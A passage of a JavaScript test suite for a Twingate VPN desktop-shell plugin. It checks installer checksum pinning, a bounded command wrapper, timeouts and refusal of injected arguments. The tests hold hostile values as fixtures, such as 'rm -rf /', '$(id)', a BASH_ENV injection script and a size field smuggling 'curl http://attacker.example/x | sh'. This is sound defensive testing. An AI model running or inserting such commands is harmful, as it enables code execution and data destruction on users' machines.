  h.now += h.minLaunchGapMs - 1
  assert.equal(h.runInTerminal("twingate start"), false, "the floor ended early")

  // Past it: allowed again.
  h.now += 2
  assert.equal(h.runInTerminal("twingate start"), true, "the floor never released")
  assert.equal(h.launches.length, 2)
})

test("observed state cannot shorten the launch floor", () => {
  // The whole point: actionPending is cleared by a status poll, and the
  // launched action is what moves the state, so clearing it must not re-open
  // the window.
  const h = makeHost()
  h.runInTerminal("twingate start")
  h.actionPending = false
  h.connectionState = "online"
  h.now += 10   // a poll came back almost instantly
  assert.equal(h.runInTerminal("twingate start"), false,
    "a status poll shortened a wall-clock floor")
})

test("the floor is armed only when a terminal actually launched", () => {
  // Arming on a refused action would extend the window without doing anything.
  const h = makeHost({ bar: { run: () => { throw new Error("must not launch") } } })
  h.actionPending = true            // refused for a different reason
  assert.equal(h.runInTerminal("x"), false)
  assert.equal(h._lastLaunchMs, 0, "a refused action armed the floor")
})

test("a later non-connect action invalidates old browser attribution", () => {
  const h = makeHost({ _connectLaunchMs: 900000 })
  assert.equal(h.runInTerminal("twingate disconnect"), true)
  assert.equal(h._connectLaunchMs, 0,
    "a later terminal action left an earlier connect able to authorize a URL")

  const refused = makeHost({ _connectLaunchMs: 900000, actionPending: true })
  assert.equal(refused.runInTerminal("twingate disconnect"), false)
  assert.equal(refused._connectLaunchMs, 900000,
    "an action that never launched erased valid connect attribution")
})

test("an intent is recorded only when the action actually launched", () => {
  // _desired moves the switch, so it is set only for an action that launched.
  const fn = SERVICE.slice(SERVICE.indexOf("function toggleConnection"))
  const body = fn.slice(0, fn.indexOf("\n  }"))
  const assignments = body.match(/_desired = \d/g) || []
  assert.ok(assignments.length >= 2, `expected every branch to set an intent, saw ${assignments.length}`)
  for (const line of body.split("\n")) {
    if (!/_desired = \d/.test(line)) continue
    assert.ok(/\?\s*\(_desired/.test(line),
      `_desired is set unconditionally, not on a launched action: ${line.trim()}`)
  }
})

test("the IPC connect verbs report what happened, not always success", () => {
  // A refused action must not report "ok" to a script.
  for (const verb of ["connect", "disconnect"]) {
    const fn = PANEL.slice(PANEL.indexOf(`function ${verb}(): string {`))
    const body = fn.slice(0, fn.indexOf("\n    }"))
    assert.ok(/return "not-installed"/.test(body), `${verb} must report not-installed`)
    assert.ok(/\?\s*"ok"\s*:\s*"busy"/.test(body), `${verb} must distinguish ok from busy`)
  }
})

test("a failed resource listing surfaces its error instead of going quiet", () => {
  // A listing that fails outright must say so, not leave a stale list.
  assert.ok(/resourcesStderr/.test(SERVICE), "no stderr collector for the listing")
  const fn = SERVICE.slice(SERVICE.indexOf("id: resourcesStdout"))
  const body = fn.slice(0, fn.indexOf("\n  }"))
  assert.ok(/resourcesStderr\.text/.test(body), "the listing's stderr is collected but never read")
  assert.ok(/root\.lastError\s*=/.test(body), "a failed listing must surface something")
})

// ── The installer, actually executed ──────────────────────────────────
// String-asserting the rendered script proves what it SAYS, not what it DOES.
// This runs it, with curl/sha256sum/sudo/pacman stubbed onto PATH, and checks
// which of them the script reaches.

function runInstallScript(arch, curlBehaviour) {
  const os = require("node:os")
  const cp = require("node:child_process")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-install-"))
  const stub = (name, body) => {
    const f = path.join(dir, name)
    fs.writeFileSync(f, "#!/bin/bash\n" + body + "\n")
    fs.chmodSync(f, 0o755)
  }
  stub("uname", `echo ${arch}`)
  stub("sudo", 'echo "SUDO-REACHED: $*"')
  stub("pacman", 'echo "PACMAN-REACHED: $*"')
  stub("curl", curlBehaviour)
  const script = path.join(dir, "install.sh")
  // The rendered script pins PATH so a shadowed curl/sha256sum cannot reach
  // `sudo pacman`. These tests stub exactly those binaries, so they replace
  // that line with the stub directory -- deliberately, and only here. Two
  // separate tests below assert the real pinned line and prove it is
  // effective at run time, so this substitution cannot hide its removal.
  fs.writeFileSync(script, renderInstallScript().replace(
    "PATH=/usr/bin:/bin", "PATH=" + dir + ":/usr/bin:/bin"))
  const out = cp.execFileSync("bash", [script], {
    env: { ...process.env, PATH: dir + ":" + process.env.PATH },
    encoding: "utf8", stdio: ["ignore", "pipe", "pipe"]
  })
  fs.rmSync(dir, { recursive: true, force: true })
  return out
}

// Writes whatever it is given to the -o path, so the checksum decides.
const CURL_WRITES = (payload) =>
  `for a in "$@"; do [ "$prev" = "-o" ] && out="$a"; prev="$a"; done\n` +
  `printf '%s' ${payload} > "$out"`

test("an unpinned architecture refuses without downloading anything", () => {
  const out = runInstallScript("riscv64", 'echo "CURL-REACHED"; exit 1')
  assert.match(out, /No pinned Twingate build for riscv64/)
  assert.ok(!out.includes("CURL-REACHED"), "must not download for an unpinned arch")
  assert.ok(!out.includes("PACMAN-REACHED"), "must not install for an unpinned arch")
})

test("a failed download never reaches the package manager", () => {
  const out = runInstallScript("x86_64", "exit 22")
  assert.match(out, /Download failed/)
  assert.ok(!out.includes("PACMAN-REACHED"), "a failed download must not install")
})

test("tampered bytes are refused before the package manager sees them", () => {
  // The whole point of the pin: the published bytes must not be able to change
  // independently of the reviewed commit.
  const out = runInstallScript("x86_64", CURL_WRITES("'TAMPERED'"))
  assert.match(out, /CHECKSUM MISMATCH/)
  assert.ok(!out.includes("PACMAN-REACHED"), "tampered bytes must never reach pacman")
  assert.ok(!out.includes("SUDO-REACHED"), "tampered bytes must never reach sudo")
})

test("the install is offered for confirmation, never forced", () => {
  // Bytes whose digest matches the pin. Generated here so the test carries no
  // 10 MB fixture: the script only ever compares against `sum`.
  const good = "the-real-package-bytes"
  const digest = require("node:crypto").createHash("sha256").update(good).digest("hex")
  const src = fs.readFileSync(path.join(__dirname, "..", "Model.js"), "utf8")
  const real = Model.CLIENT_BUILDS.x86_64.sha256
  assert.ok(src.includes(real), "the pinned digest must come from Model.js")
  // Swap only the digest, so every other line of the script is the real one.
  const patched = renderInstallScript().replace(real, digest)
  const os = require("node:os"), cp = require("node:child_process")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-install-"))
  for (const [n, b] of [["uname", "echo x86_64"], ["sudo", 'echo "SUDO-REACHED: $*"'],
                        ["pacman", 'echo "PACMAN-REACHED: $*"'], ["curl", CURL_WRITES("'" + good + "'")]]) {
    fs.writeFileSync(path.join(dir, n), "#!/bin/bash\n" + b + "\n"); fs.chmodSync(path.join(dir, n), 0o755)
  }
  fs.writeFileSync(path.join(dir, "i.sh"),
    patched.replace("PATH=/usr/bin:/bin", "PATH=" + dir + ":/usr/bin:/bin"))
  const out = cp.execFileSync("bash", [path.join(dir, "i.sh")], {
    env: { ...process.env, PATH: dir + ":" + process.env.PATH }, encoding: "utf8" })
  fs.rmSync(dir, { recursive: true, force: true })
  assert.match(out, /SUDO-REACHED: pacman -U/, "verified bytes must reach the installer")
  assert.ok(!out.includes("--noconfirm"), "the user must confirm the install")
})

// ── The producer-side bound, actually executed ────────────────────────
// StdioCollector has no size limit, so output is bounded in the shell command
// itself, before the shell buffers it. These run that command.

function extractFunction(name) {
  // Brace-matching aware of strings, comments and regex literals, so an
  // apostrophe in a comment or a brace in a regex does not end the scan early.
  const src = SERVICE.slice(SERVICE.indexOf("function " + name))
  let depth = 0, i = src.indexOf("{"), seen = false
  while (i < src.length) {
    const c = src[i], next = src[i + 1]
    if (c === "/" && next === "/") {                 // line comment
      const nl = src.indexOf("\n", i)
      i = nl === -1 ? src.length : nl
      continue
    }
    if (c === "/" && next === "*") {                 // block comment
      const end = src.indexOf("*/", i + 2)
      i = end === -1 ? src.length : end + 2
      continue
    }
    if (c === '"' || c === "'") {                    // string literal
      i++
      while (i < src.length && src[i] !== c) i += src[i] === "\\" ? 2 : 1
      i++
      continue
    }
    if (c === "/") {                                 // regex literal
      i++
      while (i < src.length && src[i] !== "/") i += src[i] === "\\" ? 2 : 1
      i++
      continue
    }
    if (c === "{") { depth++; seen = true }
    else if (c === "}") { depth--; if (seen && depth === 0) { i++; break } }
    i++
  }
  return src.slice(0, i)
}

const bounded = (() => {
  const logged = []
  const fn = new Function("Model", "_log",
    extractFunction("_bounded") + "; return _bounded")(Model, (m) => logged.push(m))
  return { fn, logged }
})()

// Runs a real command through the real wrapper and reports both streams and
// the exit code separately, which is the whole point of the fd swap.
function runBounded(argv, dir) {
  const cp = require("node:child_process")
  const cmd = bounded.fn(argv)
  assert.ok(cmd.length > 0, "wrapper refused a legitimate command")
  const r = cp.spawnSync(cmd[0], cmd.slice(1), {
    env: { ...process.env, PATH: dir + ":" + process.env.PATH },
    // A wrapper that stops terminating must fail the test, not hang the run.
    encoding: "utf8", maxBuffer: 32 * 1024 * 1024, timeout: 30000
  })
  assert.notEqual(r.signal, "SIGTERM", "the wrapper never terminated")
  return { out: r.stdout, err: r.stderr, code: r.status }
}

// Unique to this suite, so pgrep cannot match an unrelated process.
const RUNAWAY_MARKER = "tw-runaway-probe-9f3c"

function stubDir() {
  const os = require("node:os")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-bound-"))
  const write = (name, body) => {
    const f = path.join(dir, name)
    fs.writeFileSync(f, "#!/bin/bash\n" + body + "\n")
    fs.chmodSync(f, 0o755)
  }
  // Writes to both streams and exits non-zero, like the real CLI does for
  // several ordinary states.
  write("tgstub", 'printf OUT; printf ERR >&2; exit 3')
  write("tgflood-out", 'exec yes AAAA')
  write("tgflood-err", 'exec yes BBBB >&2')
  write("tgflood-marked", `exec -a ${RUNAWAY_MARKER} yes AAAA`)
  write("tgflood-both", 'yes CCCC & yes DDDD >&2')
  // Well-formed rows far past the bound: few and very long, so the byte bound
  // clips them rather than the row cap. The UTF-8 variant uses 3-byte
  // characters, so the byte cap is hit while the decoded string stays well
  // under the same number of code units.
  write("tgflood-utf8",
    'printf "Name\\tAddress\\tAuth\\n"; i=0; while [ $i -lt 150 ]; do ' +
    'printf "%s%s\\thost%s.example.com\\tAuthenticated\\n" "$i" "$(printf \'\\u65e5\\u672c\\u8a9e%.0s\' $(seq 1 1000))" "$i"; ' +
    'i=$((i+1)); done')
  write("tgflood-rows",
    'printf "Name\\tAddress\\tAuth\\n"; i=0; while [ $i -lt 150 ]; do ' +
    'printf "res%s\\t%s.example.com\\tAuthenticated\\n" "$i" "$(printf \'a%.0s\' $(seq 1 9000))"; ' +
    'i=$((i+1)); done')
  return dir
}

test("the wrapper does not source BASH_ENV", () => {
  // Non-interactive `bash -c` sources $BASH_ENV before running its script.
  // Verified by execution rather than trusted: the fixture writes a marker,
  // and the wrapper must not run it.
  const os = require("node:os")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-benv-"))
  const marker = path.join(dir, "marker")
  fs.writeFileSync(path.join(dir, "evil.sh"), `printf INJECTED > ${marker}\n`)
  const cp = require("node:child_process")
  const cmd = bounded.fn(["true"])
  cp.spawnSync(cmd[0], cmd.slice(1), {
    env: { ...process.env, BASH_ENV: path.join(dir, "evil.sh"), ENV: path.join(dir, "evil.sh") },
    encoding: "utf8"
  })
  assert.ok(!fs.existsSync(marker), "the wrapper sourced BASH_ENV")
  // Control: prove the fixture WOULD fire without the guard, so this test
  // cannot pass because the fixture is simply broken.
  cp.spawnSync("bash", ["-c", "true"], {
    env: { ...process.env, BASH_ENV: path.join(dir, "evil.sh") }, encoding: "utf8"
  })
  assert.ok(fs.existsSync(marker), "fixture never fired; the test proves nothing")
  fs.rmSync(dir, { recursive: true, force: true })
})

test("the wrapper keeps stdout and stderr separate", () => {
  // They must not be merged: normalizeStatus parses stdout for a state token,
  // so stderr noise reaching it would be read as a connection state.
  const dir = stubDir()
  const r = runBounded(["tgstub"], dir)
  assert.equal(r.out, "OUT", "stdout was polluted")
  assert.equal(r.err, "ERR", "stderr was polluted")
  fs.rmSync(dir, { recursive: true, force: true })
})

test("the wrapper preserves the CLI's own exit code", () => {
  // The handlers decide from exitCode whether they got a real answer; a naive
  // pipe would report head's status (0) and turn every failure into success.
  const dir = stubDir()
  assert.equal(runBounded(["tgstub"], dir).code, 3, "exit code was masked by the pipeline")
  assert.equal(runBounded(["true"], dir).code, 0, "success was not reported as success")
  assert.equal(runBounded(["false"], dir).code, 1, "failure was not reported as failure")
  fs.rmSync(dir, { recursive: true, force: true })
})

test("a flood on either stream is cut off at READ_LIMIT", () => {
  const dir = stubDir()
  const o = runBounded(["tgflood-out"], dir)
  assert.equal(o.out.length, Model.READ_LIMIT, "stdout was not bounded")
  const e = runBounded(["tgflood-err"], dir)
  assert.equal(e.err.length, Model.READ_LIMIT, "stderr was not bounded")
  // Both at once: neither stream may borrow the other's headroom.
  const b = runBounded(["tgflood-both"], dir)
  assert.equal(b.out.length, Model.READ_LIMIT, "stdout unbounded while stderr flooded")
  assert.equal(b.err.length, Model.READ_LIMIT, "stderr unbounded while stdout flooded")
  fs.rmSync(dir, { recursive: true, force: true })
})

test("an over-long listing is still REPORTED as truncated through the real pipeline", () => {
  // Through the real wrapper, exactly as a poll runs, so the producer cap and
  // the parser's clip detection are tested together.
  const dir = stubDir()
  const r = runBounded(["tgflood-rows"], dir)
  assert.equal(r.out.length, Model.READ_LIMIT, "fixture did not reach the bound")
  const parsed = Model.parseResources(r.out.slice(0, Model.READ_LIMIT))
  assert.equal(parsed.truncated, true,
    "a clipped listing was presented as complete")
  assert.ok(parsed.length > 0, "clipping must not empty the list")
  // The flag must come from the BYTE clip, not the row cap -- otherwise this
  // test passes no matter what the byte bound does.
  assert.ok(parsed.length < Model.MAX_RESOURCES,
    "row cap reached, so this fixture cannot isolate the byte clip")
  // And an ordinary listing must NOT be marked truncated.
  const small = Model.parseResources("Name\tAddress\tAuth\nweb\tweb.example.com\tAuthenticated")
  assert.ok(!small.truncated, "a short listing was wrongly marked truncated")
  fs.rmSync(dir, { recursive: true, force: true })
})

test("a runaway CLI is killed, not absorbed", () => {
  // The point of bounding the producer rather than the consumer: head closes
  // the pipe, the CLI takes SIGPIPE and dies. If this ever hangs instead, the
  // test times out -- which is the failure we want to see.
  const dir = stubDir()
  const r = runBounded(["tgflood-marked"], dir)
  assert.notEqual(r.code, 0, "a killed producer must not report success")
  // Match OUR producer by a unique argv marker, not `pgrep -x yes`: a global
  // name match fails whenever anything unrelated on the machine runs `yes`.
  // SIGPIPE kills the producer, but reaping is not instantaneous -- polling for
  // a bounded moment is the difference between a deterministic test and one
  // that fails a few percent of the time for no reason.
  const cp = require("node:child_process")
  let leaked = null
  for (let i = 0; i < 40; i++) {
    leaked = cp.spawnSync("pgrep", ["-f", RUNAWAY_MARKER], { encoding: "utf8", timeout: 5000 })
    if (leaked.status !== 0) break
    cp.spawnSync("sleep", ["0.05"])
  }
  assert.notEqual(leaked.status, 0,
    `the runaway producer outlived the wrapper by >2s: ${leaked.stdout}`)
  fs.rmSync(dir, { recursive: true, force: true })
})

test("the wrapper refuses an argument it did not expect", () => {
  // It renders into a shell string, so it validates rather than trusts --
  // the same rule the CLIENT_BUILDS loop follows.
  for (const bad of ["twingate; rm -rf /", "$(id)", "a b", "`id`", "x|y", ">out"]) {
    assert.deepEqual(bounded.fn(["twingate", bad]), [],
      `wrapper accepted ${JSON.stringify(bad)}`)
  }
  assert.ok(bounded.fn(["twingate", "resources", "-d", "--all"]).length > 0,
    "wrapper rejected the real resources command")
})

test("a command that asks a question gets an answer or an empty input, never a hang", () => {
  // Quickshell's child stdin is a pipe that never closes. `twingate account
  // logout` asks for confirmation and, before this, sat reading it until the
  // 300-second deadline -- live, with the account still signed in.
  const cp = require("node:child_process"), os = require("node:os")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-stdin-"))
  fs.writeFileSync(path.join(dir, "asks"),
    "#!/bin/bash\nprintf 'Are you sure? [y/N]: '\nif read -r reply; then echo \"got:$reply\"; else echo 'got:EOF'; fi\n")
  fs.chmodSync(path.join(dir, "asks"), 0o755)
  const run = (answer) => {
    const cmd = bounded.fn(["asks"], 5, answer)
    assert.ok(cmd.length > 0, "the wrapper refused a legitimate command")
    // stdin is an open pipe that is never written, exactly as in the shell.
    const r = cp.spawnSync(cmd[0], cmd.slice(1), {
      env: { ...process.env, PATH: dir + ":" + process.env.PATH },
      stdio: ["pipe", "pipe", "pipe"], encoding: "utf8", timeout: 15000
    })
    assert.notEqual(r.signal, "SIGTERM", "the command hung waiting for input")
    return r.stdout
  }
  const started = Date.now()
  assert.match(run(undefined), /got:EOF/, "a prompt without an answer did not read an empty input")
  assert.match(run("y"), /got:y$/m, "the answer did not reach the prompt")
  assert.ok(Date.now() - started < 4000, "a prompt waited instead of reading its input at once")
  fs.rmSync(dir, { recursive: true, force: true })
  // Only a one-letter y or n is ever rendered.
  for (const bad of ["yes", "y; id", "", "$(id)", "Y"])
    assert.deepEqual(bounded.fn(["asks"], 5, bad), [], `rendered the answer ${JSON.stringify(bad)}`)
})

test("the wrapper renders only known executables, and only in front", () => {
  assert.ok(bounded.fn(["/usr/bin/pkexec", "/usr/bin/twingate", "connect"]).length > 0,
    "the connect command was refused")
  assert.deepEqual(bounded.fn(["/usr/bin/pkexec", "/usr/bin/systemctl", "enable", "twingate.service"]), [],
    "an executable the plugin never runs was rendered")
  // An unknown absolute path, anywhere.
  assert.deepEqual(bounded.fn(["/bin/sh", "-c", "id"]), [])
  assert.deepEqual(bounded.fn(["/usr/bin/pkexec", "/tmp/evil"]), [])
  // A trusted path after an ordinary argument is an argument, and refused.
  assert.deepEqual(bounded.fn(["/usr/bin/twingate", "connect", "/usr/bin/pkexec"]), [])
  // The action deadline is rendered, and validated like the poll deadline.
  const cmd = bounded.fn(["/usr/bin/twingate", "status"], Model.ACTION_TIMEOUT_SEC)
  assert.equal(cmd[cmd.indexOf("--signal=KILL") + 1], String(Model.ACTION_TIMEOUT_SEC))
  assert.deepEqual(bounded.fn(["/usr/bin/twingate", "status"], "1; id"), [])
})

test("every collected process is launched through the wrapper", () => {
  // The bound is worthless if a process is ever given a raw argv.
  const procs = ["statusProcess", "verboseProcess", "resourcesProcess",
                 "accountProcess", "actionProcess"]
  for (const proc of procs) {
    const assigns = SERVICE.match(new RegExp(proc + "\\.command = [^\\n]*", "g")) || []
    assert.equal(assigns.length, 1, `${proc} is assigned ${assigns.length} times`)
    assert.ok(/= cmd$/.test(assigns[0].trim()),
      `${proc} bypasses the wrapper: ${assigns[0].trim()}`)
  }
  // Every collected process in the file is in the list above.
  const collected = (SERVICE.match(/id: \w+Process/g) || []).filter(x => x !== "id: whichProcess")
  assert.equal(collected.length, procs.length, `unlisted process: ${collected.join(", ")}`)
  // And the wrapper's result must be checked before it is used, once per
  // launcher.
  assert.equal((SERVICE.match(/if \(cmd\.length === 0\) (?:return|\{)/g) || []).length, procs.length,
    "a refused command would be launched anyway")
})

// ── The download ceiling ──────────────────────────────────────────────

test("the installer caps the transfer at the exact pinned size", () => {
  // The digest already fixes the byte count, but it cannot say so until curl
  // has finished writing. This is that same bound applied on the wire.
  const script = renderInstallScript()
  for (const arch of Object.keys(Model.CLIENT_BUILDS)) {
    const bytes = Model.CLIENT_BUILDS[arch].bytes
    assert.ok(Number.isInteger(bytes) && bytes > 0, `${arch} has no pinned size`)
    assert.ok(script.includes("max='" + bytes + "'"), `${arch} size is not rendered`)
  }
  assert.ok(/--max-filesize\s+"\$max"/.test(script), "the ceiling is never passed to curl")
  // A ceiling applied after the write would be no ceiling at all.
  assert.ok(script.indexOf("--max-filesize") < script.indexOf("sha256sum"),
    "the ceiling is applied after verification")
})

test("the installer will not let a redirect change scheme or loop", () => {
  const script = renderInstallScript()
  assert.ok(/--proto '=https'/.test(script), "no scheme restriction")
  assert.ok(/--proto-redir '=https'/.test(script), "a redirect could downgrade the scheme")
  assert.ok(/--max-redirs \d+/.test(script), "the redirect chain is unbounded")
})

test("a build entry with a malformed size is refused, not rendered", () => {
  const poisoned = {
    x86_64: Model.CLIENT_BUILDS.x86_64,
    evil: {
      file: "twingate-amd64.pkg.tar.zst",
      sha256: "0".repeat(64),
      bytes: "1'; curl http://attacker.example/x | sh; #"
    }
  }
  const script = renderInstallScript(poisoned)
  assert.ok(!script.includes("attacker.example"), "an injected size reached the shell")
  assert.ok(!/'evil'\)/.test(script), "the malformed entry was rendered anyway")
  // The legitimate entry beside it must still be there.
  assert.ok(script.includes(Model.CLIENT_BUILDS.x86_64.sha256), "x86_64 was wrongly dropped")
})

test("curl is actually handed the ceiling at run time", () => {
  // Rendering proves the flag is in the string; this proves curl receives it
  // with the right value, and that pacman still gets the verified file.
  const os = require("node:os")
  const cp = require("node:child_process")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-ceiling-"))
  const stub = (name, body) => {
    const f = path.join(dir, name)
    fs.writeFileSync(f, "#!/bin/bash\n" + body + "\n")
    fs.chmodSync(f, 0o755)
  }
  stub("uname", "echo x86_64")
  stub("sudo", 'echo "SUDO-REACHED: $*"')
  stub("pacman", 'echo "PACMAN-REACHED"')
  stub("curl", 'echo "CURL-ARGS: $*" >&2; exit 22')
  const script = path.join(dir, "i.sh")
  fs.writeFileSync(script, renderInstallScript().replace(
    "PATH=/usr/bin:/bin", "PATH=" + dir + ":/usr/bin:/bin"))
  const r = cp.spawnSync("bash", [script], {
    env: { ...process.env, PATH: dir + ":" + process.env.PATH }, encoding: "utf8"
  })
  const args = (r.stderr.match(/CURL-ARGS: .*/) || [""])[0]
  assert.ok(args.includes("--max-filesize " + Model.CLIENT_BUILDS.x86_64.bytes),
    `curl did not receive the pinned ceiling: ${args}`)
  assert.ok(args.includes("--proto-redir =https"), `curl did not receive the scheme limit: ${args}`)
  assert.ok(!/PACMAN-REACHED/.test(r.stdout), "a refused download still reached pacman")
  fs.rmSync(dir, { recursive: true, force: true })
})

// ── QML rules that no JS test and no validator will catch ─────────────

test("no property name begins with a capital", () => {
  // A hard QML rule, not style: such a property fails to parse and takes the
  // whole plugin down. Neither these tests nor `omarchy plugin validate` load
  // the QML, so this is the only check short of a real shell.
  for (const file of ["Service.qml", "Panel.qml", "TwingateIcon.qml"]) {
    const src = fs.readFileSync(path.join(__dirname, "..", file), "utf8")
    const bad = src.match(/^\s*(?:readonly\s+|required\s+|default\s+)*property\s+[\w<>]+\s+[A-Z]\w*/gm) || []
    assert.deepEqual(bad, [], `${file} declares a property beginning with a capital`)
  }
})

test("every QML file the manifest points at exists and is non-empty", () => {
  const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "manifest.json"), "utf8"))
  for (const entry of Object.values(manifest.entryPoints || {})) {
    const p = path.join(__dirname, "..", entry)
    assert.ok(fs.existsSync(p), `entry point ${entry} does not exist`)
    assert.ok(fs.statSync(p).size > 0, `entry point ${entry} is empty`)
  }
})


test("a malformed CLIENT_VERSION is refused rather than rendered", () => {
  // The version is rendered into url='...' and, at the echo, inside double
  // quotes where $(...) runs.
  const src = SERVICE.slice(SERVICE.indexOf("function installClient"))
  const body = extractFunction("installClient")
  for (const bad of ["1.0 $(id)", "1.0 `id`", "../../etc", "1.0; rm -rf /"]) {
    let captured = null
    const model = Object.assign(Object.create(null), Model, { CLIENT_VERSION: bad })
    new Function("Model", "runInTerminal", "_log", body + "; installClient()")(
      model, (c) => { captured = c }, () => {})
    assert.equal(captured, null, `installClient rendered a malformed version: ${bad}`)
  }
  // The real version must still render.
  assert.ok(renderInstallScript().includes(Model.CLIENT_VERSION), "the real version was refused")
})

test("diagnostics cannot report resources for a disconnected client", () => {
  // Diagnostics reports the count unconditionally, so a disconnect with the
  // panel closed must still clear the list.
  const body = extractFunction("refreshResources")
  const self = {
    resourcesProcess: { running: false, command: null },
    wantResources: false,
    connected: false,
    resources: [{ name: "web" }, { name: "db" }],
    resourceScope: "default",
    _bounded: () => ["bash"],
    _armPollWatchdog() {}
  }
  new Function("self", `with (self) { ${body}; refreshResources() }`)(self)
  assert.deepEqual(self.resources, [],
    "a disconnected client kept its resource list")
})

test("losing the CLI clears authentication and connect attribution", () => {
  // Removing the client mid-session must not leave a URL or a recent-connect
  // marker that can authorize an unrelated authentication after reinstall.
  const start = SERVICE.indexOf("id: whichProcess")
  const section = SERVICE.slice(start, SERVICE.indexOf("\n  Process {", start + 1))
  const missing = section.slice(section.indexOf("} else {"))
  for (const assignment of [
    /root\.authUrl\s*=\s*""/,
    /root\._openedAuthUrl\s*=\s*""/,
    /root\._autoOpenArmed\s*=\s*false/,
    /root\._connectLaunchMs\s*=\s*0/,
    /root\._lastState\s*=\s*""/,
    /root\.actionError\s*=\s*""/
  ]) assert.ok(assignment.test(missing), `missing-state reset absent: ${assignment}`)
})

// ── Byte bounds and deadlines ─────────────────────────────────────────

test("a listing that exactly fills the bound is not falsely marked truncated", () => {
  // What READ_LIMIT = MAX_INPUT + 1 buys: a complete listing of exactly
  // MAX_INPUT bytes is not mistaken for a clipped one.
  assert.equal(Model.READ_LIMIT, Model.MAX_INPUT + 1)
  const exact = "a".repeat(Model.MAX_INPUT)
  assert.equal(Model.byteLength(exact), Model.MAX_INPUT)
  assert.equal(Model.wasClipped(exact), false, "a complete listing was flagged truncated")
  // One byte more is the producer's cap, and must read as clipped.
  assert.equal(Model.wasClipped("a".repeat(Model.READ_LIMIT)), true)
})

test("byteLength counts UTF-8 bytes, not UTF-16 code units", () => {
  assert.equal(Model.byteLength("abc"), 3)
  assert.equal(Model.byteLength("é"), 2)
  assert.equal(Model.byteLength("日"), 3)
  assert.equal(Model.byteLength("😀"), 4)          // surrogate pair, counted once
  assert.equal(Model.byteLength("日本語"), 9)
  assert.equal(Model.byteLength(""), 0)
})

test("a UTF-8 listing clipped by the producer is REPORTED as truncated", () => {
  // `head -c` caps bytes while string length counts UTF-16 units; they agree
  // only for ASCII. Non-Latin resource names are ordinary, not exotic.
  const dir = stubDir()
  const r = runBounded(["tgflood-utf8"], dir)
  assert.equal(r.out.length < Model.MAX_INPUT, true,
    "fixture must decode to FEWER units than the bound, or it proves nothing")
  const parsed = Model.parseResources(r.out.slice(0, Model.READ_LIMIT))
  assert.equal(parsed.truncated, true, "a clipped UTF-8 listing was presented as complete")
  assert.ok(parsed.length < Model.MAX_RESOURCES, "row cap reached; cannot isolate the byte clip")
  fs.rmSync(dir, { recursive: true, force: true })
})

test("the wrapper reaps a signal-resistant child when the deadline fires", () => {
  // A CLI that forks a child and exits leaves the child holding the pipe.
  // timeout wraps bash and kills its whole process group, so the bound covers
  // the wrapper, not one process inside it.
  assert.ok(Model.CLI_TIMEOUT_SEC > 0 && Model.CLI_TIMEOUT_SEC < 15,
    "the timeout must fire before the 15s poll watchdog")
  const cmd = bounded.fn(["twingate", "status", "-d"])
  const i = cmd.indexOf("/usr/bin/timeout"), b = cmd.indexOf("/usr/bin/bash")
  assert.ok(i !== -1 && b !== -1 && i < b,
    `timeout must wrap bash, not sit inside it: ${cmd.join(" ")}`)

  const cp = require("node:child_process"), os = require("node:os")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-hang-"))
  const marker = "tw-timeout-child-" + process.pid
  // Exits immediately, leaving a same-process-group child that holds the
  // inherited pipes and ignores SIGTERM. `timeout -k` is not sufficient here:
  // bash accepts TERM and exits, so timeout stops monitoring it before the
  // delayed KILL and the resistant child survives.
  fs.writeFileSync(path.join(dir, "forker"),
    "#!/bin/bash\n" +
    `bash -c 'trap "" TERM; exec -a ${marker} sleep 60' &\n` +
    "exit 0\n")
  fs.chmodSync(path.join(dir, "forker"), 0o755)

  const short = cmd.map(a => a === String(Model.CLI_TIMEOUT_SEC) ? "3" : a)
  const script = short[short.length - 1].replace("twingate status -d", "forker")
  const started = Date.now()
  const r = cp.spawnSync(short[0], [...short.slice(1, -1), script], {
    env: { ...process.env, PATH: dir + ":" + process.env.PATH },
    encoding: "utf8", timeout: 25000
  })
  const elapsed = Date.now() - started
  assert.notEqual(r.status, 0, "a timed-out wrapper must not report success")
  assert.ok(elapsed < 9000, `wrapper did not self-bound with a forking CLI: ${elapsed}ms`)

  // Check the actual invariant, not merely that the tracked wrapper returned.
  // Clean up before asserting so a regression cannot poison later tests.
  const leaked = cp.spawnSync("pgrep", ["-f", marker], { encoding: "utf8", timeout: 5000 })
  if (leaked.status === 0)
    cp.spawnSync("pkill", ["-KILL", "-f", marker], { encoding: "utf8", timeout: 5000 })
  fs.rmSync(dir, { recursive: true, force: true })
  assert.notEqual(leaked.status, 0,
    `a signal-resistant descendant survived the deadline: ${leaked.stdout}`)
})

test("a hung CLI is bounded even when it produces nothing", () => {
  const cp = require("node:child_process")
  const cmd = bounded.fn(["twingate", "status", "-d"])
  const short = cmd.map(a => a === String(Model.CLI_TIMEOUT_SEC) ? "2" : a)
  const script = short[short.length - 1].replace("twingate status -d", "sleep 60")
  const started = Date.now()
  const r = cp.spawnSync(short[0], [...short.slice(1, -1), script],
    { encoding: "utf8", timeout: 20000 })
  assert.ok(Date.now() - started < 8000, "a silent hang was not bounded")
  assert.notEqual(r.status, 0, "a timed-out CLI must not report success")
})

test("stderr is never parsed as connection state", () => {
  // normalizeStatus matches a prefix, so a diagnostic on stderr like
  // "online: failed to contact daemon" would parse as `online`.
  assert.equal(Model.normalizeStatus("online: failed to contact daemon"), "online",
    "prefix matching is deliberate; this is why stderr must not reach it")
  for (const call of SERVICE.match(/normalizeStatus\([^)]*\)/g) || []) {
    assert.ok(!/\berr\b/.test(call), `stderr reaches normalizeStatus: ${call}`)
  }
})

test("the installer pins PATH before it runs anything", () => {
  const script = renderInstallScript()
  assert.ok(/^PATH=\/usr\/bin:\/bin$/m.test(script), "PATH is not pinned")
  assert.ok(/^export PATH$/m.test(script), "the pinned PATH is not exported")
  // It must come before the first command that could be shadowed.
  for (const bin of ["curl", "sha256sum", "sudo", "pacman", "mktemp", "uname"]) {
    assert.ok(script.indexOf("PATH=/usr/bin:/bin") < script.indexOf(bin),
      `${bin} is resolved before PATH is pinned`)
  }
})

test("a shadowed binary on PATH is not used by the installer", () => {
  // Effectiveness, not presence. Rendered with an architecture that cannot
